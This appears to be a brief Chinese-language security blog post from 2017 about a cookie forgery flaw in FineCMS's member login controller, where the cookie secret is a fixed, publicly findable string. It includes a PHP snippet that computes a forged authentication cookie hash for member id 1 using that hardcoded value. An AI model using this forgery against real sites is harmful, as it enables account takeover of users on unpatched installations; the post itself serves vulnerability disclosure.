---
layout: post
title:  "Finecms Cookie Forged"
date:   2017-03-13 15:04:55
comments: true
categories: php bug
---
位置39行
{% highlight text %}
/controllers/member/LoginController.php
{% endhighlight %}

看上去很容易被伪造只要知道 SITE_MEMBER_COOKIE 就行了

cookie表前缀+字符串 ，我通过github搜索发现字符串并不是随机生成的而是固定的值

{% highlight php %}

                  set_cookie('member_id', $member['id'], $time);

                    set_cookie('member_code', substr(md5(SITE_MEMBER_COOKIE . $member['id']), 5, 20), $time);


}

{% endhighlight %}

伪造cookie

{% highlight php %}


$hash = substr(md5("2967e68d382902a"."1"), 5, 20);

echo $hash;


}




